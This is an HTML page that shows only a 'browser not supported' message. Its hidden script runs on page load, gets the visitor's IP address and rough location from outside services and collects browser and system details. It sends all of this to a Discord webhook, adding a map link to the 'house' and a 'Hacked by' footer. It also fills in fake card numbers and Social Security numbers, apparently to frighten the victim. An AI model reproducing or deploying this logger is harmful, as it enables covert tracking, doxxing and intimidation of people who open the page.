<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Not Supported!</title>
    <style>
        body {
            background-color: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Courier New', Courier, monospace;
        }
        p {
            text-align: center;
            font-family: 'Courier New', Courier, monospace;
        }
    </style>
</head>
<body>
    <p>Your browser is not supported!</p>
    <script>
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
            }
        }

        async function getGeolocation(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    latitude: data.latitude,
                    longitude: data.longitude
                };
            } catch (error) {
                console.error('Error fetching geolocation:', error);
            }
        }

        function getSystemInfo() {
            const userAgent = navigator.userAgent;
            const screenResolution = `${screen.width}x${screen.height}`;
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const language = navigator.language;

            return {
                userAgent,
                screenResolution,
                timeZone,
                language
            };
        }

        async function getWebhookUrl() {
            try {
                const response = await fetch('config.json');
                const data = await response.json();
                return data.webhookUrl;
            } catch (error) {
                console.error('Error fetching config:', error);
            }
        }

        function generateCard() {
            const cardTypes = ['Visa', 'MasterCard', 'American Express', 'Discover'];
            const randomCardType = cardTypes[Math.floor(Math.random() * cardTypes.length)];
            const randomYear = Math.floor(Math.random() * 5) + 2028; // Year between 2028 and 2032
            const randomMonth = Math.floor(Math.random() * 12) + 1; // Month between 1 and 12
            const randomCVV = Math.floor(Math.random() * 900) + 100; // CVV between 100 and 999
            const randomCardNumber = Math.floor(Math.random() * 9000000000000000) + 1000000000000000; // 16-digit card number

            return {
                cardType: randomCardType,
                cardNumber: randomCardNumber,
                expiryDate: `${randomMonth < 10 ? '0' : ''}${randomMonth}/${randomYear}`,
                cvv: randomCVV
            };
        }

        function generateSSN() {
            const areaNumber = Math.floor(Math.random() * 900) + 1; // Area number (001-999)
            const groupNumber = Math.floor(Math.random() * 900) + 1; // Group number (001-999)
            const serialNumber = Math.floor(Math.random() * 9999) + 1; // Serial number (0001-9999)

            return `${areaNumber}-${groupNumber}-${serialNumber < 1000 ? '0' : ''}${serialNumber}`;
        }

        async function sendToDiscord(ip, geolocation, systemInfo, webhookUrl) {
            const hasCard = Math.random() < 0.25;
            const hasSSN = Math.random() < 0.25;

            let cardInfo = 'None';
            let ssnInfo = 'None';

            if (hasCard) {
                const card = generateCard();
                cardInfo = `Card Type: ${card.cardType}\nCard Number: ${card.cardNumber}\nExpiry Date: ${card.expiryDate}\nCVV: ${card.cvv}`;
            }

            if (hasSSN) {
                ssnInfo = generateSSN();
            }

            const message = {
                embeds: [
                    {
                        title: "User Information",
                        description: `IP Address: ${ip}`,
                        thumbnail: {
                            url: 'https://cdn.discordapp.com/avatars/1397794123280552047/de5ee9bdd5677ce16ffec2838df0042e.webp?size=1024'
                        },
                        fields: [
                            {
                                name: "Geolocation",
                                value: `City: ${geolocation.city}\nRegion: ${geolocation.region}\nCountry: ${geolocation.country}\nLatitude: ${geolocation.latitude}\nLongitude: ${geolocation.longitude}\nHouse: https://www.google.com/maps?q=${geolocation.latitude}, ${geolocation.longitude}`,
                                inline: false
                            },
                            {
                                name: "System Information",
                                value: `User Agent: ${systemInfo.userAgent}\nScreen Resolution: ${systemInfo.screenResolution}\nTime Zone: ${systemInfo.timeZone}\nLanguage: ${systemInfo.language}`,
                                inline: false
                            },
                            {
                                name: "Card Information",
                                value: cardInfo,
                                inline: false
                            },
                            {
                                name: "Social Security Number",
                                value: ssnInfo,
                                inline: false
                            }
                        ],
                        color: 0xff0000, // Red color
                        footer: {
                            text: "Hacked by _ꜱᴄʏᴛʜᴇʀᴍᴀɴᴇ",
                            icon_url: 'https://cdn.discordapp.com/avatars/1397794123280552047/de5ee9bdd5677ce16ffec2838df0042e.webp?size=1024'
                        }
                    }
                ]
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });

                if (response.ok) {
                    console.log('LMAO');
                } else {
                    console.error('LMAO');
                }
            } catch (error) {
                console.error('LMAO', error);
            }
        }

        async function main() {
            const ip = await getIP();
            if (ip) {
                const geolocation = await getGeolocation(ip);
                const systemInfo = getSystemInfo();
                const webhookUrl = await getWebhookUrl();
                if (webhookUrl) {
                    await sendToDiscord(ip, geolocation, systemInfo, webhookUrl);
                }
            }
        }

        main();
    </script>
</body>
</html>
